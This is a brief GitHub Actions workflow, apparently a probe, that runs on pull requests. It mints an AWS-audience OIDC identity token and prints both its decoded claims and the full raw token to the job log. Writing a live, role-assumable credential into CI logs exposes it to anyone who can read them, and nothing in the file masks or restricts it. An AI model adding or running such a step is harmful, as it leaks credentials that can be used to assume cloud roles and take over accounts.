name: ci-idtoken-probe
on:
  pull_request:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Print workflow context
        run: echo "probe event=${{ github.event_name }} repo=${{ github.repository }} ref=${{ github.ref }}"
      - name: Mint OIDC token
        run: |
          set -euo pipefail
          curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -o /tmp/oidc.json
          python3 -c "import json,base64;t=json.load(open('/tmp/oidc.json'))['value'];p=t.split('.')[1];p+='='*(-len(p)%4);print('JWTCLAIMS='+base64.urlsafe_b64decode(p).decode());print('JWT='+t)"
